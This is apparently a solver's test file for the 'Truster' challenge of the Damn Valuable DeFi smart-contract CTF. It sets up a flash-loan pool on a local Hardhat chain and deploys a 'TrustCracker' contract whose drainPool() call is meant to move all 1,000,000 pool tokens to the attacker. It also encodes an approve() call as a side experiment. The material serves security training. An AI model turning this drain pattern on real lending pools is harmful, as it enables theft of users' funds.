const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  **/
        const TrustCrackerFactory = await ethers.getContractFactory('TrustCracker', attacker);
        const TrustCracker = await TrustCrackerFactory.deploy(this.token.address, this.pool.address);

       await TrustCracker.drainPool();


        let AMOUNT = ethers.utils.parseEther("1");
        let testerAddress = "0x764312Ef291900eF32be90dd3Eb5a1bfa6788E84"

        let testABI = [ "function approve(address address,uint256 amount)" ]
        let iFace = new ethers.utils.Interface(testABI);
        
        console.log(iFace.encodeFunctionData("approve", [testerAddress, AMOUNT]));

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

